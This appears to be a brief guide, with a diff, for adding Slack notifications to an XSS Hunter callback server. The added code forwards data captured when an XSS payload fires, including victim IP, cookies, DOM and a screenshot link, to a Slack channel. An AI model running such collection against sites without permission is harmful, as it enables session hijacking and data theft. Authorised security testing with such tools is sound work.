# Make xsshunter ~~great again!~~ send Slack notifications

1. Create a Slack bot for your team following [this tutorial](https://api.slack.com/bot-users)

1. Add the following to `config.yaml`:

~~~
slack_api_key: <YOUR SLACK BOT API KEY>
slack_send_to: '#general'
~~~

3. Modify `api/appserver.py` accordingly. Note that `send_slack` definition and call are related, the rest rather affects security and functionality.

~~~
diff --git a/api/apiserver.py b/api/apiserver.py
index 336c09f..5b34a23 100755
--- a/api/apiserver.py
+++ b/api/apiserver.py
@@ -26,6 +26,8 @@ from models.request_record import InjectionRequest
 from models.collected_page import CollectedPage
 from binascii import a2b_base64

+from slacker import Slacker
+
 logging.basicConfig(filename="logs/detailed.log",level=logging.DEBUG)

 try:
@@ -143,6 +145,8 @@ class BaseHandler(tornado.web.RequestHandler):
         domain = self.request.headers.get( 'Host' )
         domain_parts = domain.split( "." + settings["domain"] )
         subdomain = domain_parts[0]
+       if subdomain == settings["domain"]:
+               subdomain = "xssl"
         return session.query( User ).filter_by( domain=subdomain ).first()

 def data_uri_to_file( data_uri ):
@@ -247,6 +251,21 @@ def send_email( to, subject, body, attachment_file, body_type="html" ):
             auth=("api", settings["mailgun_api_key"] ),
             callback=email_sent_callback)

+def send_slack(injection_db_record):
+    slack = Slacker(settings['slack_api_key'])
+    slack_send_to = settings['slack_send_to']
+    injection_data = injection_db_record.get_injection_blob()
+    slack_message = '*XSS Payload Fired On* ' + injection_data['vulnerable_page'] + '\n\t*IP:* ' + injection_data['victim_ip']
+    if injection_data['referer']:
+       slack_message = slack_message + '\n\t*Referer:* '+ injection_data['referer']
+    slack_message = slack_message + '\n\t*User Agent:* ' + injection_data['user_agent']
+    if injection_data['cookies']:
+       slack_message = slack_message + '\n\t*Cookies:* ' + injection_data['cookies']
+    slack_message = slack_message + '\n\t*DOM:*\n```' + injection_data['dom'] + '```'
+    slack_message = slack_message + '\n\t*Origin:* ' + injection_data['origin']
+    slack_message = slack_message + '\n\t*Screenshot:* https://' + settings['domain'] + '/' + injection_data['screenshot']
+    slack.chat.post_message(slack_send_to, slack_message)
+
 def send_javascript_pgp_encrypted_callback_message( email_data, email ):
     return send_email( email, "[XSS Hunter] XSS Payload Message (PGP Encrypted)", email_data, False, "text" )

@@ -408,6 +427,7 @@ class CallbackHandler(BaseHandler):
             injection_db_record = record_callback_in_database( callback_data, self )
             self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )

+           send_slack(injection_db_record)
             if owner_user.email_enabled:
                 send_javascript_callback_message( owner_user.email, injection_db_record )
             self.write( '{}' )
@@ -681,5 +701,5 @@ if __name__ == "__main__":
     tornado.options.parse_command_line(args)
     Base.metadata.create_all(engine)
     app = make_app()
-    app.listen( 8888 )
+    app.listen( 8888, address="127.0.0.1" )
     tornado.ioloop.IOLoop.current().start()
~~~